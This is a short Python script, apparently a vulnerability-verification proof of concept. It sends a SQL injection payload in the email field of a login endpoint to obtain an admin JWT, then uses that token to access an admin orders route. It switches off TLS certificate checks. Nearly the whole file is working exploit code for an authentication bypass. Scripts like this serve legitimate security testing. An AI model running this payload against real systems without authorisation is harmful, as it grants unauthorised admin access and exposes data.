     1	#!/usr/bin/env python3
     2	"""Verify: SQL Injection auth bypass in POST /auth/login (email field).
     3	
     4	Sends an SQLi payload in the 'email' JSON field of POST /auth/login and
     5	checks whether the server returns an authenticated JWT for an admin user
     6	and whether that JWT grants access to /admin/orders.
     7	
     8	Optional (override defaults):
     9	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    10	
    11	Usage:
    12	    python3 verify.py
    13	"""
    14	import os, sys, base64, json, requests, urllib3
    15	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    16	
    17	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com").rstrip("/")
    18	
    19	def decode_jwt(tok):
    20	    try:
    21	        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
    22	        return json.loads(base64.urlsafe_b64decode(p).decode())
    23	    except Exception:
    24	        return {}
    25	
    26	def check():
    27	    payload = "zzz' OR email LIKE 'admin%'-- "
    28	    try:
    29	        r = requests.post(f"{TARGET_URL}/auth/login",
    30	                          json={"email": payload, "password": "x"},
    31	                          verify=False, timeout=15)
    32	    except Exception as e:
    33	        print(f"[NOT VULNERABLE] Request error: {e}")
    34	        sys.exit(1)
    35	
    36	    if r.status_code != 200:
    37	        print(f"[NOT VULNERABLE] Login rejected the SQLi payload (HTTP {r.status_code})")
    38	        sys.exit(1)
    39	
    40	    body = r.json()
    41	    tok = body.get("token")
    42	    if not tok:
    43	        print(f"[NOT VULNERABLE] No token in response: {r.text[:200]}")
    44	        sys.exit(1)
    45	
    46	    claims = decode_jwt(tok)
    47	    if not claims.get("is_admin"):
    48	        print(f"[NOT VULNERABLE] Token issued but not admin: {claims}")
    49	        sys.exit(1)
    50	
    51	    r2 = requests.get(f"{TARGET_URL}/admin/orders",
    52	                      headers={"Authorization": f"Bearer {tok}"},
    53	                      verify=False, timeout=15)
    54	    if r2.status_code == 200 and r2.json().get("success"):
    55	        print(f"[VULNERABLE] SQLi in POST /auth/login yields admin JWT "
    56	              f"(user_id={claims.get('user_id')}, is_admin={claims.get('is_admin')}); "
    57	              f"/admin/orders returned HTTP 200.")
    58	        sys.exit(0)
    59	
    60	    print(f"[NOT VULNERABLE] Admin route rejected the injected token "
    61	          f"(HTTP {r2.status_code})")
    62	    sys.exit(1)
    63	
    64	if __name__ == "__main__":
    65	    check()